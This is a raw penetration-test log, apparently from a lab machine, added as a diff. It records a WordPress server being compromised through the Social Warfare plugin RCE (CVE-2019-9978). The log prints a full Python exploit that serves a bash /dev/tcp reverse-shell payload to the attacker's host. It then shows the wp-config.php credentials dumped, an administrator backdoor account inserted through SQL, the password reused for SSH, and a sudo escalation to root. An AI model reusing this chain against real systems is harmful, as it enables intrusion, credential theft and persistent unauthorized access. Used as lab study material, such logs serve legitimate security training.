@@ -1,0 +1,356 @@
+
+
+
+http://192.168.167.123/wordpress/
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit Social Warfare 3.5.2
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)                | multiple/webapps/52346.py
+WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                    | php/webapps/46794.py
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit -m multiple/webapps/52346.py
+  Exploit: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
+      URL: https://www.exploit-db.com/exploits/52346
+     Path: /usr/share/exploitdb/exploits/multiple/webapps/52346.py
+    Codes: CVE-2019-9978
+ Verified: False
+File Type: Python script, ASCII text executable
+Copied to: /home/kali/52346.py
+
+
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# cat 52346.py 
+#!/usr/bin/env python3
+
+# Exploit Title: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
+# Date: 25-06-2025
+# Exploit Author: Huseyin Mardini (@housma)
+# Original Researcher: Luka Sikic
+# Original Exploit Author: hash3liZer
+# Vendor Homepage: https://wordpress.org/plugins/social-warfare/
+# Software Link: https://downloads.wordpress.org/plugin/social-warfare.3.5.2.zip
+# Version: <= 3.5.2
+# CVE: CVE-2019-9978
+# Tested On: WordPress 5.1.1 with Social Warfare 3.5.2 (on Ubuntu 20.04)
+# Python Version: Python 3.x
+# Reference: https://www.exploit-db.com/exploits/46794
+# Github (original PoC): https://github.com/hash3liZer/CVE-2019-9978
+
+# The currently listed exploit for *CVE-2019-9978* (Exploit ID 46794<https://www.exploit-db.com/exploits/46794>) appears to no longer work as intended in many modern environments
+
+# Usage:
+#   1. Edit the config section below and replace `ATTACKER_IP` with your machine's IP.
+#   2. Run the script: `python3 exploit.py`
+#   3. It will:
+#       - Create a PHP payload and save it as `payload.txt` (or any filename you set in PAYLOAD_FILE)
+#       - Start an HTTP server on `HTTP_PORT` to host the payload
+#       - Start a Netcat listener on `LISTEN_PORT`
+#       - Trigger the vulnerability via the vulnerable `swp_debug` parameter
+#   4. On success, you get a reverse shell as `www-data`.
+#
+# Note:
+#   - PAYLOAD_FILE defines only the name of the file to be created and served.
+#   - Make sure ports 8001 and 4444 are open and not in use.
+
+import requests
+import threading
+import http.server
+import socketserver
+import os
+import subprocess
+import time
+
+# --- Config ---
+TARGET_URL = "http://example.com"
+ATTACKER_IP = "xxx.xxx.xx.xx"  # Change to your attack box IP
+HTTP_PORT = 8000
+LISTEN_PORT = 4444
+PAYLOAD_FILE = "payload.txt"
+
+
+def create_payload():
+    """Write exact reverse shell payload using valid PHP syntax"""
+    payload = f'<pre>system("bash -c \\"bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1\\"")</pre>'
+    with open(PAYLOAD_FILE, "w") as f:
+        f.write(payload)
+    print(f"[+] Payload written to {PAYLOAD_FILE}")
+
+
+def start_http_server():
+    """Serve payload over HTTP"""
+    handler = http.server.SimpleHTTPRequestHandler
+    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
+        print(f"[+] HTTP server running at port {HTTP_PORT}")
+        httpd.serve_forever()
+
+
+def start_listener():
+    """Start Netcat listener"""
+    print(f"[+] Listening on port {LISTEN_PORT} for reverse shell...")
+    subprocess.call(["nc", "-lvnp", str(LISTEN_PORT)])
+
+
+def send_exploit():
+    """Trigger the exploit with vulnerable parameter"""
+    payload_url = f"http://{ATTACKER_IP}:{HTTP_PORT}/{PAYLOAD_FILE}"
+    exploit = f"{TARGET_URL}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={payload_url}"
+    print(f"[+] Sending exploit: {exploit}")
+    try:
+        requests.get(exploit, timeout=5)
+    except requests.exceptions.RequestException:
+        pass
+
+
+def main():
+    create_payload()
+
+    # Start web server in background
+    http_thread = threading.Thread(target=start_http_server, daemon=True)
+    http_thread.start()
+    time.sleep(2)  # Give server time to start
+
+    # Start listener in background
+    listener_thread = threading.Thread(target=start_listener)
+    listener_thread.start()
+    time.sleep(1)
+
+    # Send the malicious request
+    send_exploit()
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("[-] Interrupted by user.")                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano 52346.py       
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# python3 52346.py                                              
+[+] Payload written to payload.txt
+[+] HTTP server running at port 8000
+[+] Listening on port 4444 for reverse shell...
+listening on [any] 4444 ...
+[+] Sending exploit: http://192.168.167.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.210:8000/payload.txt
+192.168.167.123 - - [02/Oct/2025 07:34:11] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
+connect to [192.168.45.210] from (UNKNOWN) [192.168.167.123] 35222
+bash: cannot set terminal process group (494): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ 
+
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ find /var/www -name "wp-config.php" 2>/dev/null
+/var/www/html/wordpress/wp-config.php
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ cat /var/www/html/wordpress/wp-config.php
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress_db' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wp_user' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'R3&]vzhHmMn9,:-5' );
+
+/** MySQL hostname */
+define( 'DB_HOST', 'localhost' );
+
+/** Database Charset to use in creating database tables. */
+define( 'DB_CHARSET', 'utf8mb4' );
+
+/** The Database Collate type. Don't change this if in doubt. */
+define( 'DB_COLLATE', '' );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( 'AUTH_KEY',         '$bDhwe@ aW2=HmnqU6GU:#uE.Zfk-?;_:u.Q][{Xi0Z_k,+#nxnI[TNl2YB[<[cI' );
+define( 'SECURE_AUTH_KEY',  '0D#hUv0AK{@zD -S[tO/@x2ZqEUb6H~7dU}|qon*o9To(!25rn25=^RnE83}czwx' );
+define( 'LOGGED_IN_KEY',    '_.sLFXmT yAhC!QUo8.NXNm]l~}1m5{uWse59w)<PML i4PQX50f{wh%(Hr|qThu' );
+define( 'NONCE_KEY',        '3TG=HS42u(X7s6.WUIeQ{@P$w(:]7.]Gmtk`ZlH5.`zAmU0K},(Z^srahRcNIUQY' );
+define( 'AUTH_SALT',        '<i1,O4cg-nF0$uzV08?YgCVyx/Pe!bUZ!WZ$uLfQSHW8[0:%{GRP19D.%rvA!<}P' );
+define( 'SECURE_AUTH_SALT', 'qNuof_(c=U36P(7jk4#l3bKoMJA9tHz(F!U-X;wQz8,In,:8*F^WNHB}^I`0Cs][' );
+define( 'LOGGED_IN_SALT',   '}%].&sH`s8IBlb+iebj*Cp8:9#ctz{Py_d_O-OkAF|K;r(IH}6P7y;v{DXG*#N>W' );
+define( 'NONCE_SALT',       ':<^2H)#:@7|lQP.M2FFL!+H1M&]nri4~)^6f/u&k|Bl$!xq2)@<jeZacZ8&mrpV}' );
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( 'WP_DEBUG', false );
+
+/* That's all, stop editing! Happy publishing. */
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( 'ABSPATH' ) ) {
+	define( 'ABSPATH', __DIR__ . '/' );
+}
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . 'wp-settings.php';
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ 
+
+www-data@wpwn:/var/www/html/wordpress/wp-admin$ mysql -u wp_user -p'R3&]vzhHmMn9,:-5' wordpress_db
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 58
+Server version: 10.3.23-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [wordpress_db]> show tables
+    -> 
+    -> ;
++------------------------+
+| Tables_in_wordpress_db |
++------------------------+
+| wp_commentmeta         |
+| wp_comments            |
+| wp_links               |
+| wp_options             |
+| wp_postmeta            |
+| wp_posts               |
+| wp_term_relationships  |
+| wp_term_taxonomy       |
+| wp_termmeta            |
+| wp_terms               |
+| wp_usermeta            |
+| wp_users               |
++------------------------+
+12 rows in set (0.000 sec)
+
+
+MariaDB [wordpress_db]> SELECT wp_users;
+ERROR 1054 (42S22): Unknown column 'wp_users' in 'field list'
+MariaDB [wordpress_db]> SELECT * FROM wp_users;
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email          | user_url                         | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BoIPbgc5i8WpBP2HzqoeQW3jfRVAyU1 | admin         | unknown@uknown.1337 | http://192.168.167.123/wordpress | 2020-08-17 23:26:45 |                     |           0 | admin        |
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+1 row in set (0.001 sec)
+
+MariaDB [wordpress_db]> 
+
+INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status, display_name)
+VALUES ('hacker', MD5('Password123!'), 'hacker', 'hacker@example.com', 0, 'hacker');
+SET @userid = LAST_INSERT_ID();
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES
+(@userid, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'),
+(@userid, 'wp_user_level', '10');
+
+
+MariaDB [wordpress_db]> INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_status, display_name)
+    -> VALUES ('hacker', MD5('Password123!'), 'hacker', 'hacker@example.com', 0, 'hacker');
+Query OK, 1 row affected (0.004 sec)
+
+MariaDB [wordpress_db]> SET @userid = LAST_INSERT_ID();
+Query OK, 0 rows affected (0.000 sec)
+
+MariaDB [wordpress_db]> INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES
+    -> (@userid, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'),
+    -> (@userid, 'wp_user_level', '10');
+Query OK, 2 rows affected (0.004 sec)
+Records: 2  Duplicates: 0  Warnings: 0
+
+MariaDB [wordpress_db]> SELECT * FROM wp_users;
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+| ID | user_login | user_pass                          | user_nicename | user_email          | user_url                         | user_registered     | user_activation_key | user_status | display_name |
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+|  1 | admin      | $P$BoIPbgc5i8WpBP2HzqoeQW3jfRVAyU1 | admin         | unknown@uknown.1337 | http://192.168.167.123/wordpress | 2020-08-17 23:26:45 |                     |           0 | admin        |
+|  2 | hacker     | 2c103f2c4ed1e59c0b4e2e01821770fa   | hacker        | hacker@example.com  |                                  | 0000-00-00 00:00:00 |                     |           0 | hacker       |
++----+------------+------------------------------------+---------------+---------------------+----------------------------------+---------------------+---------------------+-------------+--------------+
+2 rows in set (0.000 sec)
+
+MariaDB [wordpress_db]> 
+
+not crackable, though gets us into the wordpress site.
+
+we reuse the password found in the wp-config.php file
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh takis@192.168.167.123
+The authenticity of host '192.168.167.123 (192.168.167.123)' can't be established.
+ED25519 key fingerprint is SHA256:00KRKQTJjtAvDkKElPvoQF0dKGBnVGDhFOzIhaDWXs8.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.167.123' (ED25519) to the list of known hosts.
+takis@192.168.167.123's password: 
+Linux wpwn 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+takis@wpwn:~$ 
+takis@wpwn:~$ sudo -l
+Matching Defaults entries for takis on wpwn:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User takis may run the following commands on wpwn:
+    (ALL) NOPASSWD: ALL
+takis@wpwn:~$ ls -lsa /usr/bin/bash
+1144 -rwxr-xr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash
+takis@wpwn:~$ sudo /usr/bin/bash -p
+root@wpwn:/home/takis# 
+
+
